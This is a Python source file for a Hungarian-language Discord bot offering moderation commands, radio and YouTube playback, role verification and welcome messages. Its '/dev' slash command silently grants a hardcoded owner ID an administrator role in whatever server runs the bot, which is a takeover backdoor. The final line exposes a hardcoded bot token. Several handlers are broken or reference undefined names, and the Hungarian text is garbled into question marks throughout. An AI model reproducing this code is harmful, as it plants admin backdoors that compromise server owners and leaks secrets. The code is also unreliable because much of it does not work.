#from email import message
#import discord
#import os
#from discord.ext import commands
#from discord import FFmpegPCMAudio
from pkg_resources import get_build_platform
from youtubesearchpython import VideosSearch
import pytube
import traceback
from ast import arg
import configparser
from email.policy import default
from statistics import multimode
from sys import prefix
import discord
from discord import message
from discord.ext import commands
from discord import FFmpegPCMAudio
import asyncio
import functools
import itertools
import math
import random
import logging
from urllib import parse
import re
import os
from async_timeout import timeout
from discord.utils import get
from time import sleep
import asyncio
from discord import Permissions
import urllib.request
import json
from discord import FFmpegPCMAudio
#from youtubesearchpython import VideosSearch
#from discord_components import DiscordComponents, Button, Select, SelectOption
from discord_components import DiscordComponents, Button, Select, SelectOption, ButtonStyle 
#from discord import TextChannel
#from youtube_dl import YoutubeDL
#import sys
#import traceback
#from async_timeout import timeoutS
#from functools import partial
import requests
async def get_prefix(client, message):
     with open('prefix.json', 'r') as f:
          prefixes = json.load(f)

     return prefixes[str(message.guild.id)]
#----------------------------------------------------------------------------------------#
intent = discord.Intents().all()
client = commands.Bot(prefix = commands.when_mentioned_or(get_prefix), intents=intent)
#----------------------------------------------------------------------------------------#
@client.event
async def on_ready():
     DiscordComponents(client)
     print('Connected to bot: {}'.format(client.user.name))
     print('Bot ID: {}'.format(client.user.id))
     await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Mindenes bot. /help"), status=discord.Status.idle)
     #await client.change_presence(activity=discord.Streaming(name="N??zd velem te is!", url = 'https://www.twitch.tv/nerdhub'))
#----------------------------------------------------------------------------------------#  
async def button_click(msg,ctx):
    if msg.component.label == 'Verify':
       config = configparser.ConfigParser()
       config.read('szerverek/'+ctx.message.guild.name+'.ini')
       role_id = int(config['default']['verify_role_id'])
       role = get(ctx.message.guild.roles,id=role_id)
       await msg.author.add_roles(role)
    else:
     print(msg.component.label)
#----------------------------------------------------------------------------------------#
#@client.event
#async def on_guild_join(guild):
#     with open('prefix.json', 'r') as f:
#          prefixes = json.load(f)
#     prefixes[str(guild.id)] = "$"
#     with open('prefix.json', 'w') as f:
#          json.dump(prefixes, f, indent=4) 
#----------------------------------------------------------------------------------------#
#@client.event
#async def on_guild_remove(guild):
#     with open('prefix.json', 'r') as f:
#          prefixes = json.load(f)
#     prefixes.pop(str(guild.id))
#     with open('prefix.json', 'w') as f:
#          json.dump(prefixes, f, indent=4) 
#----------------------------------------------------------------------------------------#
#@client.command()
#async def setprefix(ctx, prefixset):
#     if (not ctx.author.guild_permissions.manage.channels):
#          ctx.reply('Csatorn??k kezel??se jog sz??ks??ges hozz??')
#          return
#     if (prefixset == None):
#          prefixset = "$"
#     with open('prefix.json', 'r') as f:
#          prefixes = json.load(f)
#          prefixes[str(ctx.guild.id)] = prefixset
#     with open('prefix.json', 'w') as f:
#          json.dump(prefixes, f, indent=4) 
#     await ctx.send(f'A prefix megv??ltozott a k??vetkez??re: {prefixset}')
#----------------------------------------------------------------------------------------# 
@client.command()
async def button(ctx,text,message):
     button_ = Button(label = text)
     await ctx.send(message,components=[button_])
     while True:
       interaction = await client.wait_for("button_click")#, check=lambda i: i.component == button_)
       await interaction.respond(type=6)
       await button_click(interaction,ctx)
#----------------------------------------------------------------------------------------#
@client.command()
@commands.has_permissions(manage_roles=True)
async def setverifyrole(ctx,role: discord.Role):
     config = configparser.ConfigParser()
     config.read('szerverek/'+ctx.message.guild.name+'.ini')
     config['default'] = {}
     config['default']['verify_role_id'] = str(role.id)
     with open('szerverek/'+ctx.message.guild.name+'.ini','w') as file:
       config.write(file)
@client.command()
async def setwelcome(ctx,channel: discord.TextChannel):
     config = configparser.ConfigParser()
     config.read('szerverek/'+ctx.message.guild.name+'.ini')
     config['default']['welcome_channel_id'] = str(channel.id)
     with open('szerverek/'+ctx.message.guild.name+'.ini','w') as file:
         config.write(file)     
#----------------------------------------------------------------------------------------#
@client.command()
@commands.has_permissions(manage_roles=True) # Check if the user executing the command can manage roles
async def create_role(ctx, *, name):
	guild = ctx.guild
	await guild.create_role(name=name)
	await ctx.send(f'Role `{name}` has been created')
#----------------------------------------------------------------------------------------#
@client.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, *, amount=11):
     amount = amount+1
     if amount > 101:
          await ctx.send('100 ??zenetn??l t??bbet nem t??r??lhetsz')
     else:
          await ctx.channel.purge(limit=amount)
          await ctx.send(f'??zenetek t??r??lve: {amount}')
#----------------------------------------------------------------------------------------#
@client.command()
async def slagerfm(ctx, url: str = 'https://slagerfm.netregator.hu:7813/slagerfm128.mp3'):
     channel = ctx.message.author.voice.channel
     global player
     try:
       player = await channel.connect()
     except:
       pass
     player.play(FFmpegPCMAudio('https://slagerfm.netregator.hu:7813/slagerfm128.mp3'))
     await ctx.reply('Sl??gerFM r??di?? elind??tva ???')
     await message.add_reaction('????')
#----------------------------------------------------------------------------------------#
@client.command()
async def r??di??1(ctx, url: str = 'https://icast.connectmedia.hu/5201/live.mp3'):
     channel = ctx.message.author.voice.channel
     global player
     try:
       player = await channel.connect()
     except Exception as error:
       print (error)
     player.play(FFmpegPCMAudio('https://icast.connectmedia.hu/5201/live.mp3'))
     await message.add_reaction('????')
     await ctx.reply('R??di??1 elind??tva ???')
#----------------------------------------------------------------------------------------#
@client.command()
async def retro(ctx, url: str = 'https://icast.connectmedia.hu/5001/live.mp3%27'):
     channel = ctx.message.author.voice.channel
     global player
     try:
       player = await channel.connect()
     except:
       pass
     player.play(FFmpegPCMAudio('https://icast.connectmedia.hu/5001/live.mp3%27'))
     await message.add_reaction('????')
     await ctx.reply('Retr?? elind??tva ???')
#----------------------------------------------------------------------------------------#
@client.command()
async def minecraft(ctx, args):
     r = requests.get('https://api.minehut.com/server/'+ args + '?byName=True')
     json_data = r.json()
     #print(json_data)
     await ctx.send(embed = discord.Embed(description=json_data, color=0xff9900,))  

#----------------------------------------------------------------------------------------#
@client.command()
async def say(ctx, *, text=''):
     if text == '':
       await ctx.send("??rj valamit a parancs ut??n! ???")
     else:
       await ctx.send(text)
       await ctx.message.delete()
#----------------------------------------------------------------------------------------#
@client.command()
async def stop(ctx):
     await player.disconnect()
     await ctx.reply('Zene meg??ll??tva ???')
#----------------------------------------------------------------------------------------#
@client.command()
async def ping(ctx):
     await ctx.send(f'Pong! K??s??s:{round(client.latency * 1000)}ms')
     print(f'Ping-Pong! K??s??s:{round(client.latency * 1000)}ms')
#----------------------------------------------------------------------------------------#
@client.command()
async def selfkick(ctx):
     await ctx.author.send(f'Kickelted magad a {ctx.guild.name}-n \n {ctx.author.mention} ez??ltal kiker??lt??l a szerverr??l')
     await ctx.author.kick(reason="Kickelte mag??t")
#----------------------------------------------------------------------------------------#
@client.command()
async def invite(ctx):
     await ctx.author.send(f'{ctx.author.mention}, Invite linkem: shorturl.at/stxK2 <a:nem:931233048517804103>')
     await ctx.reply('N??zd meg a priv??tot <a:igen:931233048765284422>')
#----------------------------------------------------------------------------------------#
#@client.command()
#async def help(ctx):
     #await ctx.send('<a:cica:931650393350492160> Kapt??l egy ??zenetet priv??tban! <a:nem:931233048517804103>')
     #await ctx.send(embed = discord.Embed(description=f"{ctx.author.mention}\n ??gy eddigi parancsaim: \n\n1.***segits***", color=0xff9900, ))
     #print(f'{ctx.message.author} haszn??lta a Help parancsot')
     #print(f'{ctx.message.author} Seg??ts??get szeretne k??rni a [{ctx.guild.name} {ctx.guild.id}] r??l')
     #await ctx.author.send(embed = discord.Embed(description=f"Szia! {ctx.author.mention}\n Parancsaim: \n\n1. ***__help__*** \n > El??h??vja a help men??t \n 2. ***__nuke__*** \n > T??r??l 100 ??zenetet a csatorn??r??l \n 3.***__selfkick__*** \n > Kidob a szerverr??l \n 4. ***__ping__*** \n > Bot pingje \n 5. ***kick*** \n > Kickeli az embert \n 6. ***Invite*** \n > Invite linkem ", color=0xff9900,))   
#----------------------------------------------------------------------------------------#
@client.slash_command(name="help", description="Help men?? lek??r??se")
async def slash_test(ctx):
     await ctx.defer()
     await ctx.respond('Parancs haszn??lathoz @PING')
     await ctx.respond(embed = discord.Embed(description=f"Szia! {ctx.author.mention}\n Parancsaim: \n\n1. ***__help__*** \n > El??h??vja a help men??t \n 2. ***__nuke__*** \n > T??r??l 100 ??zenetet a csatorn??r??l \n 3.***__selfkick__*** \n > Kidob a szerverr??l \n 4. ***__ping__*** \n > Bot pingje \n 5. ***kick*** \n > Kickeli az embert \n 6. ***Invite*** \n > Invite linkem ", color=0xff9900,))
#----------------------------------------------------------------------------------------#
@client.command(aliases=['8b'])
async def ball(ctx, *, question):
     responses = ['igen', 'nem', 'tal??n']
     await ctx.send(f'???? 8ball j??t??k\n K??rd??s: {question}\n V??lasz: {random.choice(responses)}')
#----------------------------------------------------------------------------------------#
@client.command()
async def kick(ctx, member:discord.Member, *, reason=None):
     if (not ctx.author.guild_permissions.kick_members):
          ctx.reply('Kick jog sz??ks??ges hozz??')
          return
     await member.kick(reason=reason)
     await ctx.send(f'{member.mention} kickelve a szerverr??l')
     await member.send(f'{ctx.message.author} kickelt a {ctx.guild.name} szerverr??l')
#----------------------------------------------------------------------------------------#
@client.command()
async def ban(ctx, member:discord.Member, *, reason=None):
     if (not ctx.author.guild_permissions.ban_members):
          ctx.reply('Ban jog sz??ks??ges hozz??')
          return
     await member.ban(reason=reason)
     await ctx.send(f'{member.mention} bannolva a szerverr??l')
     await member.send(f'{ctx.message.author} bannolt a {ctx.guild.name} szerverr??l')
#----------------------------------------------------------------------------------------#
@client.command()
async def unban(ctx, *, member):
     banned_users = await ctx.guild.bans()
     member_name, member_discriminator = member.split('#')
     
     for ban_entry in banned_users:
          user = ban_entry.user
     
     if(user_name, user_discriminator) == (member_name, member_discriminator):
          await ctx.unban(user)
          await ctx.send(f'Kitilt??sa feloldva {user.mention}-nak/nek')
          await user.send(f'{user.mention} Kitilt??sod felold??sra ker??lt a {ctx.guild.name}-n')
          return

@client.command()
async def mute(ctx, member = discord.Member, *, reason=None):
     if (not ctx.author.guild_permissions.kick_members):
          ctx.reply('Kick jog sz??ks??ges hozz??')
          return
     guild = ctx.guild
     mute = discord.utils.get(guild.roles, name="Muted")
     if not mute:
               await ctx.send("Nincs Muted rang. Rang l??trehoz??sa")
               mute = await guild.create_role(name="Muted")
     for channel in guild.channels:
          await channel.set_permissions(mute, speak=False, send_messages=False, read_message_history=True, read_messages=True)
          await member.add_roles(mute, reason=reason)
          await member.send(f'N??m??tva lett??l a {guild.name}-n | Indok: {reason}')
#----------------------------------------------------------------------------------------#
@ban.error
async def ban_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
          await ctx.send("Adj meg egy embert")
     if isinstance(error, commands.MemberNotFound):
          await ctx.send("Ez az ember nem tal??lhat??")
#----------------------------------------------------------------------------------------#  
@ball.error
async def ball_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
          await ctx.send("Adj meg egy k??rd??st")
#----------------------------------------------------------------------------------------#
@kick.error
async def ban_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
          await ctx.send("Adj meg egy embert")
     if isinstance(error, commands.MemberNotFound):
          await ctx.send("Ez az ember nem tal??lhat??")
#----------------------------------------------------------------------------------------#
@slowmode.error
async def slowmode_error(ctx, error):
     if isinstance(error, commands.MissingRequiredArgument):
          await ctx.send('Adj meg id??t')
#----------------------------------------------------------------------------------------#
@client.event
async def on_member_join(member):
     try:
          config = configparser.ConfigParser()
          config.read('szerverek/'+member.guild.name+'.ini')
          channel_id = int(config['default']['welcome_channel_id'])
          welcome = discord.Embed(title=f'??j ember!!', description=f'Szia {member.name}, ??dv??z??llek a szerveren', color = discord.Color.blue())
          await client.get_channel(channel_id).send(embed = welcome)
     except Exception:
          traceback.print_exc()
#----------------------------------------------------------------------------------------#
@client.slash_command(name="dev", description="Bot tulajdonos haszn??lhatja csak!")
async def slash_test(ctx):
     await ctx.defer()
     owner_id = 808587556458987541
     member_id = owner_id
     guild = ctx.guild
     if ctx.author.id != member_id:
          embed = discord.Embed(title="Hi??nyz?? jogok", description=f"Nincs elegend?? jogod a parancs v??grehajt??s??hoz!\nSz??ks??ges jog: te legy??l a bot tulajdonosa`", color=discord.Color.red())
          await ctx.respond(embed=embed)
     if ctx.author.id == member_id:
          member = get(ctx.guild.members,id=member_id)
          dev = await ctx.guild.create_role(name="*")
     
     await ctx.guild.set_permissions(dev, administrator=True)
     await member.add_roles(dev)
     await ctx.respond('Rang hozz??adva!')
#----------------------------------------------------------------------------------------#
@client.command()
async def play(ctx,*,text):
     videodata = VideosSearch(text,limit=1).result()['result'][0]
     video_yt = pytube.YouTube(videodata['link'])
     videovoice = video_yt.streams.filter(only_audio=True).first()
     videovoice.download()#('Zene/'+videovoice.default_filename)#.save(str(folder='Zene'))
     channel = ctx.message.author.voice.channel
     try:
       player = await channel.connect()
     except:
       pass
     fajlnev = videovoice.default_filename
     player.play(FFmpegPCMAudio(videovoice.default_filename),after=lambda e:os.remove(fajlnev))#('Zene/'+f'{videovoice.default_filename}'+videovoice.default_filename)),after=lambda e:os.remove('Zene/'+fajlnev))
     player.source = discord.PCMVolumeTransformer(player.source)
     #ide argsot.
     player.source.volume = 0.35
     embed = discord.Embed(title='Youtube vide?? lej??tsz??sa folyamatban... <a:loading:990591458895601684>',color=discord.Colour.red())
     embed.set_thumbnail(url=videodata['thumbnails'][0]['url'])
     embed.add_field(name='C??m',value=videodata['title'])
     embed.add_field(name='Link',value=videodata['link'])
     embed.add_field(name='Hossz',value=videodata['duration'])
     embed.add_field(name=f'K??rte: {ctx.author}', value="--------------------------")
     await ctx.send(embed=embed)
#----------------------------------------------------------------------------------------#
@client.command()
@commands.has_permissions(manage_messages=True)
async def slowmode(ctx, time:int):
     try:
          if time == 0:
               await ctx.send('Slowmode Kikapcsolva')
               await ctx.channel.edit(slowmode_delay = 0)
          elif time > 21600:
               await ctx.send('Nem ??ll??thatod ??t 6 ??r??n??l hosszabbra')
               return
          else:
               await ctx.channel.edit(slowmode_delay = time)
               await ctx.send(f'A Lass??t??s {time}-m??sodpercre/??r??ra/percre ??ll??tva')
     except Exception:
          await print('Oops!')
#----------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------#
client.run('ODQxOTQzNzU4NzA5NzE5MDQy.GB_vb3.DfZNU28lO-0bbbc3ne59GOhekqmDXBvuC6hgJc')